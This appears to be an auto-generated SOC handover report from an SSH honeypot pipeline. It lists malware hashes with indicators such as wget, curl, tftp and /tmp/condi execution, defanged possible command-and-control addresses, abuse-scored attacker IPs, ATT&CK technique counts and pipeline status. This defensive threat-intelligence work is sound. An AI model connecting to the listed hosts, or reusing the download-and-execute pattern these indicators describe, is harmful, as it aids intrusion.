_`725d1de20672ed85f32e823fe067ed6eb17149019e146bafbbe59338df78e37f` (725d1de20672ed85f32e823f...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `chmod +x (make executable)` — `chmod +x`
- `IP:Port (possible C2)` — `51.158.248[.]122:8517`

_`7a4a3a129b726b531941b41d734521e8905d57a57a7e8a0a7e5dff41ed22f6ba` (7a4a3a129b726b531941b41d...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `52.142.44[.]95` | US | Microsoft Corporation | **100** ⚠️ | 2 |
| `14.153.244[.]142` | CN | CHINANET Guangdong province network | **100** ⚠️ | 0 |
| `46.29.26[.]195` | FI | FortiCore Digital SAS | **100** ⚠️ | 25 |
| `14.29.204[.]161` | CN | CHINANET Guangdong province network | **100** ⚠️ | 46 |
| `49.124.152[.]215` | MY | DiGi Telecommunications Sdn Bhd | **100** ⚠️ | 46 |
| `49.124.152[.]213` | MY | DiGi Telecommunications Sdn Bhd | **100** ⚠️ | 50 |
| `101.13.4[.]128` | TW | Taiwan Mobile Co., Ltd. | **100** ⚠️ | 50 |
| `130.185.96[.]113` | IL | Pelephone Communications Ltd. | **100** ⚠️ | 50 |
| `201.163.73[.]88` | MX | Alestra, S. de R.L. de C.V. | **100** ⚠️ | 50 |
| `1.247.245[.]61` | KR | SK Broadband Co Ltd | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 151 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 139 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 5 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 4 |
| [T1059.004](https://attack.mitre.org/techniques/T1059/004) | 4 |

---

## 🔕 False Positive Summary (49 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 3 |
| AbuseIPDB score 18 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 45 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 650 cases |
| Tool 34  | Credential Extractor        | ✅ 185 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 22 fingerprints |
| Tool 36  | Command Clustering          | ✅ 9 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 141 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 49 filtered (7.5%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 78 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 33 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 139 priority case(s) shown individually · 44 recon entry/entries in table (15 group(s) consolidating 433 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json auto-generated from pipeline.yml each run — tracks all active tools, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-07-15T06:20:04Z_
